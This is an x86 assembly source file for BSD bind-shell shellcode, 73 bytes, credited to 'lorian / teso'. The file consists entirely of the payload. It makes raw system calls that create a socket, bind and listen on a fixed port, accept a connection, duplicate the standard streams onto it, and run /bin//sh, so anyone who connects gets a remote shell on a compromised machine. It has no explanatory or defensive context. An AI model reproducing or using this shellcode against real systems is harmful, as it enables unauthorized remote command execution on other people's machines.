/* x86/BSD bindsh shellcode (73 bytes)
   
   lorian / teso
*/

	.globl  _cbegin
	.globl	cbegin
	.globl  _cend
	.globl	cend

_cbegin:
cbegin:
	xorl	%ebx, %ebx
	mull	%ebx
	pushl   %ebx
	incl    %ebx
	pushl   %ebx
	incl	%ebx
	pushl   %ebx
	movb    $0x61, %al
	pushl	%ebx
	int	$0x80
	xchgl   %esi, %eax
	pushl	%edx
	pushw	$0x4444
	pushw	%bx
	movl	%esp, %ebp
	pushl   $0x10
	pushl	%ebp
	pushl   %esi
	pushl	%esi
	pushl   $0x68
	popl	%eax
	int	$0x80
	movb	$0x6a, %al
	int	$0x80
	pusha
	movb    $0x1e, %al
	int	$0x80
a:	
	pushl	%ebx
	pushl   %eax
	pushl	%eax
	movb	$0x5a, %al
	int	$0x80
	decl	%ebx
	jns	a
	pushl	%edx
	movl    %esp, %ebx
	push    $0x68732F6E
        push    $0x69622F2F
	pusha   
	popl    %esi
	popl    %esi
	movb    $0x3b, %al
	int     $0x80
							
_cend:
cend:
